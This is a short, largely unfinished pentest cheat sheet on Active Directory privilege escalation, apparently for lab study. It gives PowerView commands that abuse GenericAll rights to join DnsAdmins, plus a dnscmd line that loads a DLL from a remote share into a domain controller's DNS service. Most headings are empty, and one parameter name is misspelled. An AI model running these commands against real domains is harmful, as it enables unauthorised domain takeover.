# Domain Privilege Escalation

> N.B.: You need a local admin access to do these attacks.

## ACL - Generic All

```powershell
Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}

Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-55465134614643146434643614646467'}
```
Adding yourself as a member

```powershell
Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1' 
Get-DomainUser -name 'student1'
Get-DomainGroup -SamAccountName DnsAdmins
```

## ACL - GenericWrite on User

## PrintNightmare (CVE-2021-34527)

## PrivEsc - DNS Admins 

[DNS Admins PrivEsc Guide by iRedTeam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
```powershell
dnscmd dc.pentesting.local /config /serverlevelplungindll \\student\share\privesc.dll
```

## DCSync0

## ZeroLogon (CVE-2020-1472)

## Unconstrained delegation

## constrained Delegation

## SET-SPN - Kerberoast

## ASPRoasting
